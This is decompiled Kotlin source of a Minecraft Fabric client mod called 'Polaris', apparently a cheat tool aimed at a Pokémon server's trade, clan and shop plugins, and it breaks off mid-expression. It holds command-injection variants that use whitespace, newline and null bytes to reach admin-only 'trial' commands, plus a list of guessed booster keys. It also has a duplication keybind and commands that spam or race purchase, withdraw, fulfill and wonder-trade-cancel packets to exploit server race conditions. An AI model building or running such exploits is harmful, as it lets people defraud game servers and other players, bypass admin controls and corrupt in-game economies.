package com.polaris.gts

import com.mojang.brigadier.CommandDispatcher
import com.mojang.brigadier.arguments.ArgumentType
import com.mojang.brigadier.arguments.BoolArgumentType
import com.mojang.brigadier.arguments.IntegerArgumentType
import com.mojang.brigadier.arguments.LongArgumentType
import com.mojang.brigadier.arguments.StringArgumentType
import com.mojang.brigadier.builder.LiteralArgumentBuilder
import com.mojang.brigadier.context.CommandContext
import com.tlean07.battlefactory.common.payloads.ConfirmRentalPayload
import com.tlean07.battlefactory.common.payloads.ConfirmSwapPayload
import com.tlean07.battlefactory.common.payloads.SelectRentalPayload
import com.tlean07.battlefactory.common.payloads.StartBattlePayload
import com.tlean07.clan.client.ClanClientData
import com.tlean07.clan.common.payloads.BuyClanBoosterPayload
import com.tlean07.clan.common.payloads.ClanMemberEntry
import com.tlean07.clan.common.payloads.CreateClanPayload
import com.tlean07.clan.common.payloads.DemoteMemberPayload
import com.tlean07.clan.common.payloads.InvitePlayerPayload
import com.tlean07.clan.common.payloads.KickMemberPayload
import com.tlean07.clan.common.payloads.PromoteMemberPayload
import com.tlean07.clan.common.payloads.RenameClanPayload
import com.tlean07.clan.common.payloads.SetTagColorPayload
import com.tlean07.clan.common.payloads.TransferOwnershipPayload
import com.tlean07.clan.common.payloads.UpgradeClanPayload
import com.tlean07.gts.client.GtsClientData
import com.tlean07.gts.client.GtsMyAuctionsScreen
import com.tlean07.gts.common.PokemonSpec
import com.tlean07.gts.common.PokemonSummary
import com.tlean07.gts.common.payloads.CancelWonderTradePayload
import com.tlean07.gts.common.payloads.FulfillTradePayload
import com.tlean07.gts.common.payloads.ListAuctionPayload
import com.tlean07.gts.common.payloads.ListPokemonPayload
import com.tlean07.gts.common.payloads.PlaceBidPayload
import com.tlean07.gts.common.payloads.PurchasePokemonPayload
import com.tlean07.gts.common.payloads.TradePokemonPayload
import com.tlean07.gts.common.payloads.WithdrawListingPayload
import com.tlean07.gts.common.payloads.WonderTradePayload
import com.tlean07.shop.common.payloads.RequestPurchasePayload
import com.tlean07.shop.common.payloads.RequestSellPayload
import java.util.ArrayList
import java.util.LinkedHashMap
import java.util.Locale
import java.util.UUID
import java.util.concurrent.Executors
import java.util.concurrent.ScheduledExecutorService
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger
import kotlin.internal.ProgressionUtilKt
import kotlin.jvm.internal.SourceDebugExtension
import net.fabricmc.api.ClientModInitializer
import net.fabricmc.api.EnvType
import net.fabricmc.api.Environment
import net.fabricmc.fabric.api.client.command.v2.ClientCommandManager
import net.fabricmc.fabric.api.client.command.v2.ClientCommandRegistrationCallback
import net.fabricmc.fabric.api.client.command.v2.FabricClientCommandSource
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking
import net.fabricmc.fabric.api.client.rendering.v1.HudRenderCallback
import net.fabricmc.fabric.api.client.screen.v1.ScreenEvents
import net.minecraft.class_124
import net.minecraft.class_2561
import net.minecraft.class_310
import net.minecraft.class_327
import net.minecraft.class_332
import net.minecraft.class_437
import net.minecraft.class_634
import net.minecraft.class_7157
import net.minecraft.class_8710
import net.minecraft.class_9779

@Environment(EnvType.CLIENT)
@SourceDebugExtension(["SMAP\nPolarisClient.kt\nKotlin\n*S Kotlin\n*F\n+ 1 PolarisClient.kt\ncom/polaris/gts/PolarisClient\n+ 2 _Collections.kt\nkotlin/collections/CollectionsKt___CollectionsKt\n+ 3 fake.kt\nkotlin/jvm/internal/FakeKt\n*L\n1#1,1994:1\n1563#2:1995\n1634#2,3:1996\n1878#2,3:1999\n295#2,2:2002\n1869#2,2:2005\n1617#2,9:2007\n1869#2:2016\n1870#2:2018\n1626#2:2019\n1617#2,9:2020\n1869#2:2029\n1870#2:2031\n1626#2:2032\n1193#2,2:2033\n1267#2,4:2035\n1617#2,9:2039\n1869#2:2048\n1870#2:2050\n1626#2:2051\n1#3:2004\n1#3:2017\n1#3:2030\n1#3:2049\n*S KotlinDebug\n*F\n+ 1 PolarisClient.kt\ncom/polaris/gts/PolarisClient\n*L\n1324#1:1995\n1324#1:1996,3\n1339#1:1999,3\n1638#1:2002,2\n1991#1:2005,2\n557#1:2007,9\n557#1:2016\n557#1:2018\n557#1:2019\n612#1:2020,9\n612#1:2029\n612#1:2031\n612#1:2032\n646#1:2033,2\n646#1:2035,4\n901#1:2039,9\n901#1:2048\n901#1:2050\n901#1:2051\n557#1:2017\n612#1:2030\n901#1:2049\n*E\n"])
public class PolarisClient : ClientModInitializer {
   private final val pool: ScheduledExecutorService = Executors.newScheduledThreadPool(32)
   private final val candidateBoosterKeys: List<String> =
      CollectionsKt.listOf(
         arrayOf(
            "exp",
            "EXP",
            "xp",
            "XP",
            "exp_boost",
            "xp_boost",
            "exp_2x",
            "xp_2x",
            "boost_exp",
            "boost_xp",
            "experience",
            "battle_points",
            "battlepoints",
            "bp",
            "bp_boost",
            "battle_points_boost",
            "daycare",
            "daycare_boost",
            "daycare_2x",
            "day_care",
            "passe",
            "pass",
            "passe_boost",
            "pass_boost",
            "passe_2x",
            "pass_2x",
            "safari_coins",
            "safari_coin",
            "safari",
            "safari_boost",
            "safaricoins",
            "money",
            "money_boost",
            "money_2x",
            "cash",
            "gold",
            "gold_boost",
            "gold_2x",
            "pokemon_exp",
            "pokemonexp",
            "pkmn_exp",
            "mon_exp",
            "pokemon_xp",
            "pokemon_experience",
            "pokemon_level",
            "pokemonlevel",
            "pkmn_level",
            "mon_level",
            "pokemon_lvl",
            "pkmn_lvl"
         )
      )
      private final val adminOnlyCommands: List<String> =
      CollectionsKt.listOf(arrayOf("trial convocar", "trial cancelar", "trial encerrar", "trial finalizar"))
      private final val trialInjectionVariants: List<String> =
      CollectionsKt.listOf(
         arrayOf(
            "trial convocar",
            "trial  convocar",
            "trial convocar ",
            " trial convocar",
            "trial convocar #",
            "trial convocar admin",
            "trial convocar ${owner}",
            "trial convocar @s",
            "trial convocar @p",
            "trial CONVOCAR",
            "Trial convocar",
            "trial\nconvocar",
            "trial convocar\u0000"
         )
      )

   public open fun onInitializeClient() {
      ClientTickEvents.END_CLIENT_TICK
         .register(
            { mc: class_310 ->
               `this$0`.openPendingGtsBackpack(mc)
               if (!`$welcomeSent`.element && mc.field_1724 != null) {
                  `$welcomeSent`.element = true
                  val keyName: java.lang.String = `$dupeKey`.method_16007().getString()
                  if (mc.field_1724 != null) {
                     mc.field_1724
                        .method_7353(
                           class_2561.method_43470("[POLARIS] Aperte [$keyName] pra abrir. Pra trocar a tecla: Options → Controls → Key Binds → 'Polaris'.")
                              .method_27692(class_124.field_1065) as class_2561,
                           false
                        )
                     }
               }

               while (`$dupeKey`.method_1436()) {
                  if (mc.field_1755 == null) {
                     mc.method_1507(PolarisScenarioScreen())
                  }
               }
            }
         )
         HudRenderCallback.EVENT.register({ ctx: class_332, var2: class_9779 ->
         `this$0`.drawCountdownOverlay(ctx)
         `this$0`.drawSecondTwoOverlay(ctx)
      })
      ScreenEvents.AFTER_INIT
         .register(
            { var1: class_310, screen: class_437, var3: Int, var4: Int ->
               // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
               // java.lang.NullPointerException: Cannot invoke "java.util.List.stream()" because the return value of "org.jetbrains.java.decompiler.modules.decompiler.stats.Statement.getExprents()" is null
               //   at org.vineflower.kotlin.expr.KNewExprent.lambda$toJava$0(KNewExprent.java:128)
               //   at java.base/java.util.stream.ReferencePipeline$7$1FlatMap.accept(ReferencePipeline.java:288)
               //   at java.base/java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1716)
               //   at java.base/java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:570)
               //   at java.base/java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:560)
               //   at java.base/java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:635)
               //   at java.base/java.util.stream.AbstractPipeline.evaluateToArrayNode(AbstractPipeline.java:291)
               //   at java.base/java.util.stream.ReferencePipeline.toArray(ReferencePipeline.java:652)
               //   at java.base/java.util.stream.ReferencePipeline.toArray(ReferencePipeline.java:658)
               //   at java.base/java.util.stream.ReferencePipeline.toList(ReferencePipeline.java:663)
               //   at org.vineflower.kotlin.expr.KNewExprent.toJava(KNewExprent.java:131)
               //   at org.jetbrains.java.decompiler.modules.decompiler.ExprProcessor.getCastedExprent(ExprProcessor.java:1054)
               //   at org.jetbrains.java.decompiler.modules.decompiler.exps.InvocationExprent.appendParamList(InvocationExprent.java:1151)
               //   at org.jetbrains.java.decompiler.modules.decompiler.exps.InvocationExprent.toJava(InvocationExprent.java:921)
            }
         )
         ClientCommandRegistrationCallback.EVENT
         .register(
            { dispatcher: CommandDispatcher, var2: class_7157 ->
               dispatcher.register(
                  ((((((ClientCommandManager.literal("polaris").then(ClientCommandManager.literal("help").executes({ ctx: CommandContext ->
                                       val var10001: Any = ctx.getSource()
                                       `this$0`.printHelp(var10001 as FabricClientCommandSource)
                                       1
                                    })) as LiteralArgumentBuilder)
                                    .then(
                                       ((((((((((((((((((((((((((((((((((((((ClientCommandManager.literal("gts")
                                                                                                                                                            .then(
                                                                                                                                                               ClientCommandManager.literal(
                                                                                                                                                                     "list"
                                                                                                                                                                  )
                                                                                                                                                                  .then(
                                                                                                                                                                     ClientCommandManager.argument(
                                                                                                                                                                           "slot",
                                                                                                                                                                           IntegerArgumentType.integer() as ArgumentType
                                                                                                                                                                        )
                                                                                                                                                                        .then(
                                                                                                                                                                           ClientCommandManager.argument(
                                                                                                                                                                                 "price",
                                                                                                                                                                                 LongArgumentType.longArg() as ArgumentType
                                                                                                                                                                              )
                                                                                                                                                                              .executes(
                                                                                                                                                                                 { ctx: CommandContext ->
                                                                                                                                                                                    val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                                                       ctx,
                                                                                                                                                                                       "slot"
                                                                                                                                                                                    )
                                                                                                                                                                                    val price: Long = LongArgumentType.getLong(
                                                                                                                                                                                       ctx,
                                                                                                                                                                                       "price"
                                                                                                                                                                                    )
                                                                                                                                                                                    val var10001: Any = ctx.getSource()
                                                                                                                                                                                    `this$0`.send(
                                                                                                                                                                                       var10001 as FabricClientCommandSource,
                                                                                                                                                                                       "ListPokemonPayload(slot=$slot, price=$price)",
                                                                                                                                                                                       { 
                                                                                                                                                                                          ClientPlayNetworking.send(
                                                                                                                                                                                             ListPokemonPayload(
                                                                                                                                                                                                `$slot`,
                                                                                                                                                                                                `$price`
                                                                                                                                                                                             ) as class_8710
                                                                                                                                                                                          )
                                                                                                                                                                                          Unit.INSTANCE
                                                                                                                                                                                       }
                                                                                                                                                                                    )
                                                                                                                                                                                    1
                                                                                                                                                                                 }
                                                                                                                                                                              )
                                                                                                                                                                        )
                                                                                                                                                                  )
                                                                                                                                                            ) as LiteralArgumentBuilder)
                                                                                                                                                         .then(
                                                                                                                                                            ClientCommandManager.literal(
                                                                                                                                                                  "auction"
                                                                                                                                                               )
                                                                                                                                                               .then(
                                                                                                                                                                  ClientCommandManager.argument(
                                                                                                                                                                        "slot",
                                                                                                                                                                        IntegerArgumentType.integer() as ArgumentType
                                                                                                                                                                     )
                                                                                                                                                                     .then(
                                                                                                                                                                        ClientCommandManager.argument(
                                                                                                                                                                              "bid",
                                                                                                                                                                              LongArgumentType.longArg() as ArgumentType
                                                                                                                                                                           )
                                                                                                                                                                           .then(
                                                                                                                                                                              ClientCommandManager.argument(
                                                                                                                                                                                    "duration",
                                                                                                                                                                                    LongArgumentType.longArg() as ArgumentType
                                                                                                                                                                                 )
                                                                                                                                                                                 .executes(
                                                                                                                                                                                    { ctx: CommandContext ->
                                                                                                                                                                                       val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                                                          ctx,
                                                                                                                                                                                          "slot"
                                                                                                                                                                                       )
                                                                                                                                                                                       val bid: Long = LongArgumentType.getLong(
                                                                                                                                                                                          ctx,
                                                                                                                                                                                          "bid"
                                                                                                                                                                                       )
                                                                                                                                                                                       val dur: Long = LongArgumentType.getLong(
                                                                                                                                                                                          ctx,
                                                                                                                                                                                          "duration"
                                                                                                                                                                                       )
                                                                                                                                                                                       val var10001: Any = ctx.getSource()
                                                                                                                                                                                       `this$0`.send(
                                                                                                                                                                                          var10001 as FabricClientCommandSource,
                                                                                                                                                                                          "ListAuctionPayload(slot=$slot, bid=$bid, dur=$dur)",
                                                                                                                                                                                          { 
                                                                                                                                                                                             ClientPlayNetworking.send(
                                                                                                                                                                                                ListAuctionPayload(
                                                                                                                                                                                                   `$slot`,
                                                                                                                                                                                                   `$bid`,
                                                                                                                                                                                                   `$dur`
                                                                                                                                                                                                ) as class_8710
                                                                                                                                                                                             )
                                                                                                                                                                                             Unit.INSTANCE
                                                                                                                                                                                          }
                                                                                                                                                                                       )
                                                                                                                                                                                       1
                                                                                                                                                                                    }
                                                                                                                                                                                 )
                                                                                                                                                                           )
                                                                                                                                                                     )
                                                                                                                                                               )
                                                                                                                                                         ) as LiteralArgumentBuilder)
                                                                                                                                                      .then(
                                                                                                                                                         ClientCommandManager.literal(
                                                                                                                                                               "bid"
                                                                                                                                                            )
                                                                                                                                                            .then(
                                                                                                                                                               ClientCommandManager.argument(
                                                                                                                                                                     "uuid",
                                                                                                                                                                     StringArgumentType.word() as ArgumentType
                                                                                                                                                                  )
                                                                                                                                                                  .then(
                                                                                                                                                                     ClientCommandManager.argument(
                                                                                                                                                                           "amount",
                                                                                                                                                                           LongArgumentType.longArg() as ArgumentType
                                                                                                                                                                        )
                                                                                                                                                                        .executes(
                                                                                                                                                                           { ctx: CommandContext ->
                                                                                                                                                                              val id: UUID = UUID.fromString(
                                                                                                                                                                                 StringArgumentType.getString(
                                                                                                                                                                                    ctx,
                                                                                                                                                                                    "uuid"
                                                                                                                                                                                 )
                                                                                                                                                                              )
                                                                                                                                                                              val amt: Long = LongArgumentType.getLong(
                                                                                                                                                                                 ctx,
                                                                                                                                                                                 "amount"
                                                                                                                                                                              )
                                                                                                                                                                              val var10001: Any = ctx.getSource()
                                                                                                                                                                              `this$0`.send(
                                                                                                                                                                                 var10001 as FabricClientCommandSource,
                                                                                                                                                                                 "PlaceBidPayload(uuid=$id, amount=$amt)",
                                                                                                                                                                                 { 
                                                                                                                                                                                    ClientPlayNetworking.send(
                                                                                                                                                                                       PlaceBidPayload(
                                                                                                                                                                                          `$id`,
                                                                                                                                                                                          `$amt`
                                                                                                                                                                                       ) as class_8710
                                                                                                                                                                                    )
                                                                                                                                                                                    Unit.INSTANCE
                                                                                                                                                                                 }
                                                                                                                                                                              )
                                                                                                                                                                              1
                                                                                                                                                                           }
                                                                                                                                                                        )
                                                                                                                                                                  )
                                                                                                                                                            )
                                                                                                                                                      ) as LiteralArgumentBuilder)
                                                                                                                                                   .then(
                                                                                                                                                      ClientCommandManager.literal(
                                                                                                                                                            "purchase"
                                                                                                                                                         )
                                                                                                                                                         .then(
                                                                                                                                                            ClientCommandManager.argument(
                                                                                                                                                                  "uuid",
                                                                                                                                                                  StringArgumentType.word() as ArgumentType
                                                                                                                                                               )
                                                                                                                                                               .executes(
                                                                                                                                                                  { ctx: CommandContext ->
                                                                                                                                                                     val id: UUID = UUID.fromString(
                                                                                                                                                                        StringArgumentType.getString(
                                                                                                                                                                           ctx,
                                                                                                                                                                           "uuid"
                                                                                                                                                                        )
                                                                                                                                                                     )
                                                                                                                                                                     val var10001: Any = ctx.getSource()
                                                                                                                                                                     `this$0`.send(
                                                                                                                                                                        var10001 as FabricClientCommandSource,
                                                                                                                                                                        "PurchasePokemonPayload($id)",
                                                                                                                                                                        { 
                                                                                                                                                                           ClientPlayNetworking.send(
                                                                                                                                                                              PurchasePokemonPayload(
                                                                                                                                                                                 `$id`
                                                                                                                                                                              ) as class_8710
                                                                                                                                                                           )
                                                                                                                                                                           Unit.INSTANCE
                                                                                                                                                                        }
                                                                                                                                                                     )
                                                                                                                                                                     1
                                                                                                                                                                  }
                                                                                                                                                               )
                                                                                                                                                         )
                                                                                                                                                   ) as LiteralArgumentBuilder)
                                                                                                                                                .then(
                                                                                                                                                   ClientCommandManager.literal(
                                                                                                                                                         "withdraw"
                                                                                                                                                      )
                                                                                                                                                      .then(
                                                                                                                                                         ClientCommandManager.argument(
                                                                                                                                                               "uuid",
                                                                                                                                                               StringArgumentType.word() as ArgumentType
                                                                                                                                                            )
                                                                                                                                                            .executes(
                                                                                                                                                               { ctx: CommandContext ->
                                                                                                                                                                  val id: UUID = UUID.fromString(
                                                                                                                                                                     StringArgumentType.getString(
                                                                                                                                                                        ctx,
                                                                                                                                                                        "uuid"
                                                                                                                                                                     )
                                                                                                                                                                  )
                                                                                                                                                                  val var10001: Any = ctx.getSource()
                                                                                                                                                                  `this$0`.send(
                                                                                                                                                                     var10001 as FabricClientCommandSource,
                                                                                                                                                                     "WithdrawListingPayload($id)",
                                                                                                                                                                     { 
                                                                                                                                                                        ClientPlayNetworking.send(
                                                                                                                                                                           WithdrawListingPayload(
                                                                                                                                                                              `$id`
                                                                                                                                                                           ) as class_8710
                                                                                                                                                                        )
                                                                                                                                                                        Unit.INSTANCE
                                                                                                                                                                     }
                                                                                                                                                                  )
                                                                                                                                                                  1
                                                                                                                                                               }
                                                                                                                                                            )
                                                                                                                                                      )
                                                                                                                                                ) as LiteralArgumentBuilder)
                                                                                                                                             .then(
                                                                                                                                                ClientCommandManager.literal(
                                                                                                                                                      "fulfill"
                                                                                                                                                   )
                                                                                                                                                   .then(
                                                                                                                                                      ClientCommandManager.argument(
                                                                                                                                                            "uuid",
                                                                                                                                                            StringArgumentType.word() as ArgumentType
                                                                                                                                                         )
                                                                                                                                                         .then(
                                                                                                                                                            ClientCommandManager.argument(
                                                                                                                                                                  "slot",
                                                                                                                                                                  IntegerArgumentType.integer() as ArgumentType
                                                                                                                                                               )
                                                                                                                                                               .executes(
                                                                                                                                                                  { ctx: CommandContext ->
                                                                                                                                                                     val id: UUID = UUID.fromString(
                                                                                                                                                                        StringArgumentType.getString(
                                                                                                                                                                           ctx,
                                                                                                                                                                           "uuid"
                                                                                                                                                                        )
                                                                                                                                                                     )
                                                                                                                                                                     val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                                        ctx,
                                                                                                                                                                        "slot"
                                                                                                                                                                     )
                                                                                                                                                                     val var10001: Any = ctx.getSource()
                                                                                                                                                                     `this$0`.send(
                                                                                                                                                                        var10001 as FabricClientCommandSource,
                                                                                                                                                                        "FulfillTradePayload($id, slot=$slot)",
                                                                                                                                                                        { 
                                                                                                                                                                           ClientPlayNetworking.send(
                                                                                                                                                                              FulfillTradePayload(
                                                                                                                                                                                 `$id`,
                                                                                                                                                                                 `$slot`
                                                                                                                                                                              ) as class_8710
                                                                                                                                                                           )
                                                                                                                                                                           Unit.INSTANCE
                                                                                                                                                                        }
                                                                                                                                                                     )
                                                                                                                                                                     1
                                                                                                                                                                  }
                                                                                                                                                               )
                                                                                                                                                         )
                                                                                                                                                   )
                                                                                                                                             ) as LiteralArgumentBuilder)
                                                                                                                                          .then(
                                                                                                                                             ClientCommandManager.literal(
                                                                                                                                                   "wondertrade"
                                                                                                                                                )
                                                                                                                                                .then(
                                                                                                                                                   ClientCommandManager.argument(
                                                                                                                                                         "slot",
                                                                                                                                                         IntegerArgumentType.integer() as ArgumentType
                                                                                                                                                      )
                                                                                                                                                      .executes(
                                                                                                                                                         { ctx: CommandContext ->
                                                                                                                                                            val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                               ctx,
                                                                                                                                                               "slot"
                                                                                                                                                            )
                                                                                                                                                            val var10001: Any = ctx.getSource()
                                                                                                                                                            `this$0`.send(
                                                                                                                                                               var10001 as FabricClientCommandSource,
                                                                                                                                                               "WonderTradePayload(slot=$slot)",
                                                                                                                                                               { 
                                                                                                                                                                  ClientPlayNetworking.send(
                                                                                                                                                                     WonderTradePayload(
                                                                                                                                                                        `$slot`
                                                                                                                                                                     ) as class_8710
                                                                                                                                                                  )
                                                                                                                                                                  Unit.INSTANCE
                                                                                                                                                               }
                                                                                                                                                            )
                                                                                                                                                            1
                                                                                                                                                         }
                                                                                                                                                      )
                                                                                                                                                )
                                                                                                                                          ) as LiteralArgumentBuilder)
                                                                                                                                       .then(
                                                                                                                                          ClientCommandManager.literal(
                                                                                                                                                "trade"
                                                                                                                                             )
                                                                                                                                             .then(
                                                                                                                                                ClientCommandManager.argument(
                                                                                                                                                      "slot",
                                                                                                                                                      IntegerArgumentType.integer() as ArgumentType
                                                                                                                                                   )
                                                                                                                                                   .then(
                                                                                                                                                      ClientCommandManager.argument(
                                                                                                                                                            "species",
                                                                                                                                                            StringArgumentType.string() as ArgumentType
                                                                                                                                                         )
                                                                                                                                                         .then(
                                                                                                                                                            ClientCommandManager.argument(
                                                                                                                                                                  "minLvl",
                                                                                                                                                                  IntegerArgumentType.integer() as ArgumentType
                                                                                                                                                               )
                                                                                                                                                               .then(
                                                                                                                                                                  ClientCommandManager.argument(
                                                                                                                                                                        "shiny",
                                                                                                                                                                        BoolArgumentType.bool() as ArgumentType
                                                                                                                                                                     )
                                                                                                                                                                     .executes(
                                                                                                                                                                        { ctx: CommandContext ->
                                                                                                                                                                           val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                                              ctx,
                                                                                                                                                                              "slot"
                                                                                                                                                                           )
                                                                                                                                                                           val species: java.lang.String = StringArgumentType.getString(
                                                                                                                                                                              ctx,
                                                                                                                                                                              "species"
                                                                                                                                                                           )
                                                                                                                                                                           val minLvl: Int = IntegerArgumentType.getInteger(
                                                                                                                                                                              ctx,
                                                                                                                                                                              "minLvl"
                                                                                                                                                                           )
                                                                                                                                                                           val shiny: Boolean = BoolArgumentType.getBool(
                                                                                                                                                                              ctx,
                                                                                                                                                                              "shiny"
                                                                                                                                                                           )
                                                                                                                                                                           val var10001: Any = ctx.getSource()
                                                                                                                                                                           `this$0`.send(
                                                                                                                                                                              var10001 as FabricClientCommandSource,
                                                                                                                                                                              "TradePokemonPayload(slot=$slot, $species lvl>=$minLvl shiny=$shiny)",
                                                                                                                                                                              { 
                                                                                                                                                                                 ClientPlayNetworking.send(
                                                                                                                                                                                    TradePokemonPayload(
                                                                                                                                                                                       `$slot`,
                                                                                                                                                                                       PokemonSpec(
                                                                                                                                                                                          `$species`,
                                                                                                                                                                                          `$minLvl`,
                                                                                                                                                                                          `$shiny`,
                                                                                                                                                                                          null,
                                                                                                                                                                                          null,
                                                                                                                                                                                          MapsKt.emptyMap()
                                                                                                                                                                                       )
                                                                                                                                                                                    ) as class_8710
                                                                                                                                                                                 )
                                                                                                                                                                                 Unit.INSTANCE
                                                                                                                                                                              }
                                                                                                                                                                           )
                                                                                                                                                                           1
                                                                                                                                                                        }
                                                                                                                                                                     )
                                                                                                                                                               )
                                                                                                                                                         )
                                                                                                                                                   )
                                                                                                                                             )
                                                                                                                                       ) as LiteralArgumentBuilder)
                                                                                                                                    .then(
                                                                                                                                       ClientCommandManager.literal(
                                                                                                                                             "spam_purchase"
                                                                                                                                          )
                                                                                                                                          .then(
                                                                                                                                             ClientCommandManager.argument(
                                                                                                                                                   "uuid",
                                                                                                                                                   StringArgumentType.word() as ArgumentType
                                                                                                                                                )
                                                                                                                                                .then(
                                                                                                                                                   ClientCommandManager.argument(
                                                                                                                                                         "n",
                                                                                                                                                         IntegerArgumentType.integer(
                                                                                                                                                            1,
                                                                                                                                                            1000
                                                                                                                                                         ) as ArgumentType
                                                                                                                                                      )
                                                                                                                                                      .executes(
                                                                                                                                                         { ctx: CommandContext ->
                                                                                                                                                            val id: UUID = UUID.fromString(
                                                                                                                                                               StringArgumentType.getString(
                                                                                                                                                                  ctx,
                                                                                                                                                                  "uuid"
                                                                                                                                                               )
                                                                                                                                                            )
                                                                                                                                                            val n: Int = IntegerArgumentType.getInteger(
                                                                                                                                                               ctx,
                                                                                                                                                               "n"
                                                                                                                                                            )
                                                                                                                                                            var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                                                                                                                            var10001 = var10001
                                                                                                                                                            `this$0`.spamPurchase(
                                                                                                                                                               var10001,
                                                                                                                                                               id,
                                                                                                                                                               n
                                                                                                                                                            )
                                                                                                                                                            1
                                                                                                                                                         }
                                                                                                                                                      )
                                                                                                                                                )
                                                                                                                                          )
                                                                                                                                    ) as LiteralArgumentBuilder)
                                                                                                                                 .then(
                                                                                                                                    ClientCommandManager.literal(
                                                                                                                                          "race_pw"
                                                                                                                                       )
                                                                                                                                       .then(
                                                                                                                                          ClientCommandManager.argument(
                                                                                                                                                "uuid",
                                                                                                                                                StringArgumentType.word() as ArgumentType
                                                                                                                                             )
                                                                                                                                             .then(
                                                                                                                                                ClientCommandManager.argument(
                                                                                                                                                      "n",
                                                                                                                                                      IntegerArgumentType.integer(
                                                                                                                                                         1,
                                                                                                                                                         1000
                                                                                                                                                      ) as ArgumentType
                                                                                                                                                   )
                                                                                                                                                   .executes(
                                                                                                                                                      { ctx: CommandContext ->
                                                                                                                                                         val id: UUID = UUID.fromString(
                                                                                                                                                            StringArgumentType.getString(
                                                                                                                                                               ctx,
                                                                                                                                                               "uuid"
                                                                                                                                                            )
                                                                                                                                                         )
                                                                                                                                                         val n: Int = IntegerArgumentType.getInteger(
                                                                                                                                                            ctx,
                                                                                                                                                            "n"
                                                                                                                                                         )
                                                                                                                                                         var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                                                                                                                         var10001 = var10001
                                                                                                                                                         `this$0`.racePurchaseWithdraw(
                                                                                                                                                            var10001,
                                                                                                                                                            id,
                                                                                                                                                            n
                                                                                                                                                         )
                                                                                                                                                         1
                                                                                                                                                      }
                                                                                                                                                   )
                                                                                                                                             )
                                                                                                                                       )
                                                                                                                                 ) as LiteralArgumentBuilder)
                                                                                                                              .then(
                                                                                                                                 ClientCommandManager.literal(
                                                                                                                                       "race_fulfill"
                                                                                                                                    )
                                                                                                                                    .then(
                                                                                                                                       ClientCommandManager.argument(
                                                                                                                                             "uuid",
                                                                                                                                             StringArgumentType.word() as ArgumentType
                                                                                                                                          )
                                                                                                                                          .then(
                                                                                                                                             ClientCommandManager.argument(
                                                                                                                                                   "slot",
                                                                                                                                                   IntegerArgumentType.integer() as ArgumentType
                                                                                                                                                )
                                                                                                                                                .then(
                                                                                                                                                   ClientCommandManager.argument(
                                                                                                                                                         "n",
                                                                                                                                                         IntegerArgumentType.integer(
                                                                                                                                                            1,
                                                                                                                                                            1000
                                                                                                                                                         ) as ArgumentType
                                                                                                                                                      )
                                                                                                                                                      .executes(
                                                                                                                                                         { ctx: CommandContext ->
                                                                                                                                                            val id: UUID = UUID.fromString(
                                                                                                                                                               StringArgumentType.getString(
                                                                                                                                                                  ctx,
                                                                                                                                                                  "uuid"
                                                                                                                                                               )
                                                                                                                                                            )
                                                                                                                                                            val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                               ctx,
                                                                                                                                                               "slot"
                                                                                                                                                            )
                                                                                                                                                            val n: Int = IntegerArgumentType.getInteger(
                                                                                                                                                               ctx,
                                                                                                                                                               "n"
                                                                                                                                                            )
                                                                                                                                                            var var10001: FabricClientCommandSource = (FabricClientCommandSource)ctx.getSource()
                                                                                                                                                            var10001 = var10001
                                                                                                                                                            `this$0`.raceFulfill(
                                                                                                                                                               var10001,
                                                                                                                                                               id,
                                                                                                                                                               slot,
                                                                                                                                                               n
                                                                                                                                                            )
                                                                                                                                                            1
                                                                                                                                                         }
                                                                                                                                                      )
                                                                                                                                                )
                                                                                                                                          )
                                                                                                                                    )
                                                                                                                              ) as LiteralArgumentBuilder)
                                                                                                                           .then(
                                                                                                                              ClientCommandManager.literal(
                                                                                                                                    "wt_cancel"
                                                                                                                                 )
                                                                                                                                 .then(
                                                                                                                                    ClientCommandManager.argument(
                                                                                                                                          "slot",
                                                                                                                                          IntegerArgumentType.integer() as ArgumentType
                                                                                                                                       )
                                                                                                                                       .then(
                                                                                                                                          ClientCommandManager.argument(
                                                                                                                                                "delay_ms",
                                                                                                                                                IntegerArgumentType.integer(
                                                                                                                                                   0, 60000
                                                                                                                                                ) as ArgumentType
                                                                                                                                             )
                                                                                                                                             .executes(
                                                                                                                                                { ctx: CommandContext ->
                                                                                                                                                   val slot: Int = IntegerArgumentType.getInteger(
                                                                                                                                                      ctx,
                                                                                                                                                      "slot"
                                                                                                                                                   )
                                                                                                                                                   val delay: Int = IntegerArgumentType.getInteger(
                                                                                                                                                      ctx,
                                                                                                                                                      "delay_ms"
                                                                                                                                                   )
                                                                                                                                                   val var10001: Any = ctx.getSource()
                                                                                                                                                   `this$0`.send(
                                                                                                                                                      var10001 as FabricClientCommandSource,
                                                                                                                                                      "WonderTradePayload(slot=$slot) + Cancel após $delayms",
                                                                                                                                                      { 
                                                                                                                                                         ClientPlayNetworking.send(
                                                                                                                                                            WonderTradePayload(
                                                                                                                                                               `$slot`
                                                                                                                                                            ) as class_8710
                                                                                                                                                         )
                                                                                                                                                         `this$0`.pool
                                                                                                                                                            .schedule(
                                                                                                                                                               { 
                                                                                                                                                                  ClientPlayNetworking.send(
                                                                                                                                                                     CancelWonderTradePayload.INSTANCE as class_8710
                                                                                                                                                                  )
                                                                                                                                                                  val var10001: Any = `$ctx`.getSource()
                                                                                                                                                                  `this$0`.msg(
                                                                                                                                                                     var10001 as FabricClientCommandSource,
                                                                                                                                                                     "Cancel enviado.",
                                                                                                                                                                     class_124.field_1054
                                                                                                                                                                  )
                                                                                                                                                               },
                                                                                                                                                               (long)`$delay`,
                                                                                                                                                               TimeUnit.MILLISECONDS
                                                                                                                                                            )
                                                                                                                                                            Unit.INSTANCE
                                                                                                                                                      }
                                                                                                                                                   )
                                                                                                                                                   1
